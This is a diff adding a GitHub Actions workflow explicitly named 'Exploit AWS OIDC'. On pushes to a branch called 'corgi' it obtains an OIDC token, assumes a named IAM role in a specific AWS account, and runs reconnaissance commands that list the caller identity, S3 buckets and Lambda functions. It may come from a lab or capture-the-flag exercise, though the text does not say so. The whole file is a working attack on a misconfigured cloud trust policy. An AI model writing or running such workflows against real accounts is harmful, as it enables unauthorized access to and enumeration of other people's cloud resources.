@@ -1,0 +1,31 @@
+name: Exploit AWS OIDC
+
+on:
+  push:
+    branches:
+      - corgi
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS Credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+
+      - name: Recon - List Resources
+        run: |
+          echo "=== AWS Identity ==="
+          aws sts get-caller-identity
+          
+          echo "=== S3 Buckets ==="
+          aws s3 ls
+          
+          echo "=== Lambda Functions ==="
+          aws lambda list-functions
